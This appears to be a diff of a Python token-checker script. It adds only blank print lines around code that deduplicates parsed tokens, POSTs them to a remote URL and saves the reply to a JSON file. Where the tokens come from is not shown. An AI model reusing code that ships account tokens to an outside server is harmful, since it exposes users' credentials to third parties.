@@ -69,7 +69,9 @@ class Checker:
         self.tokens_parsed = list(dict.fromkeys(tokens_parsed))
 
     def send_tokens(self):
+        print()
         print(f"Send tokens...")
+
         try:
             res = requests.post(self.url, json={"action": "checker", "data": self.tokens_parsed})
             if res.status_code != 200:
@@ -93,6 +95,7 @@ class Checker:
         with open('json_data.json', 'w', encoding='utf-8') as f:
             json.dump(self.res, f, indent=4)
 
+        print()
         print(f"Tokens saved!")
         fast_exit()
 
